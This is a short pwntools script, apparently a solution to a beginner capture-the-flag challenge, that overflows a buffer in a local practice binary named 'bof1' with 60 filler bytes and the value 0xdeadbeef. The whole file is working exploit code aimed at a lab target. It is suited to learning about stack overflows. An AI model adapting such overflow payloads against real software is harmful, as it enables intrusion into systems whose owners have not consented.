#!/usr/bin/python3

from pwn import *
# p = gdb.debug("./bof1",'''
#               b*main+58
#               c
#               ''')
p = process('./bof1')
payload = b'A'*60
payload += p64(0xdeadbeef)
p.sendlineafter(">",payload)
p.interactive()
